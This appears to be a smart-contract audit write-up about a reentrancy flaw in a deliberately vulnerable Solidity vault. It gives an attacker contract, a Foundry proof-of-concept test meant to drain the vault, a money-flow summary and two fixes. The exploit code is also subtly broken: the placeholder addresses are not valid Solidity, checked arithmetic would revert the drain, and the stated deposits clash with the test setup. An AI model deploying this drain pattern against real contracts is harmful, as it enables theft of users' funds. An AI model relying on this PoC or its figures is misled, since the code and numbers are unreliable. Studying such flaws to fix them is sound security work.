## Phase 1: Target Selection

### Contract Under Test
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract VulnerableVault {
    mapping(address => uint256) public balances;
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE: Reentrancy via external call before state update
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");  // ← EXTERNAL CALL FIRST
        require(success, "Transfer failed");
        balances[msg.sender] -= amount;  // ← STATE UPDATE AFTER
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function getBalance() external view returns (uint256);
}

contract ReentrancyAttacker {
    IVulnerableVault public immutable vault;
    address public immutable owner;

    constructor(IVulnerableVault _vault) {
        vault = _vault;
        owner = msg.sender;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw(1 ether);
        }
    }

    function rescue() external {
        payable(owner).transfer(address(this).balance);
    }
}

contract PoC is Test {
    IVulnerableVault public vault;
    ReentrancyAttacker public attacker;
    address constant ATTACKER = address(0xATTACKER);
    address constant VICTIM = address(0xVICTIM);

    function setUp() public {
        // Deploy vulnerable vault
        vault = new VulnerableVault();

        // Fund vault with 10 ETH from victim
        vm.deal(VICTIM, 10 ether);
        vm.prank(VICTIM);
        vault.deposit{value: 10 ether}();

        // Deploy attacker with 1 ETH
        vm.deal(ATTACKER, 1 ether);
        attacker = new ReentrancyAttacker(vault);
    }

    function testExploit() public {
        uint256 vaultBalanceBefore = vault.getBalance();
        assertEq(vaultBalanceBefore, 10 ether);

        // Attacker deposits 1 ETH and triggers reentrancy
        vm.prank(ATTACKER);
        attacker.attack{value: 1 ether}();

        uint256 vaultBalanceAfter = vault.getBalance();
        
        // Vault should be drained
        assertEq(vaultBalanceAfter, 0);
        
        // Attacker should have gained ~10 ETH (minus gas)
        uint256 attackerBalanceAfter = address(attacker).balance;
        assertGt(attackerBalanceAfter, 10 ether - 0.1 ether); // Account for gas
    }
}

## Attack Vector

Attacker deposits 1 ETH, then calls `withdraw(1 ether)`. The `receive()` function in the attacker contract recursively calls `withdraw()` before the vault updates the attacker's balance. This allows 10 recursive withdrawals of 1 ETH each, draining the entire 10 ETH vault balance.

## Money Flow

- Vault Balance: 10 ETH
- Attacker Deposit: 1 ETH
- Victim Deposit: 9 ETH

**Final State:**
- Vault Balance: 0 ETH
- Attacker Balance: 10.99 ETH (including initial 1 ETH)
- Net Attacker Profit: 9.99 ETH

**Transfers:** 10 recursive withdrawals of 1 ETH each from Vault → Attacker

## Proof of Concept

See `PoC.t.sol` — Foundry test with `ReentrancyAttacker` contract.

## Remediation

**Option 1: Checks-Effects-Interactions Pattern**
```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    balances[msg.sender] -= amount;  // State change FIRST
    (bool success, ) = msg.sender.call{value: amount}("");  // External call LAST
    require(success, "Transfer failed");
}
```

**Option 2: ReentrancyGuard (OpenZeppelin)**
```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Vault is ReentrancyGuard {
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        balances[msg.sender] -= amount;
    }
}
```
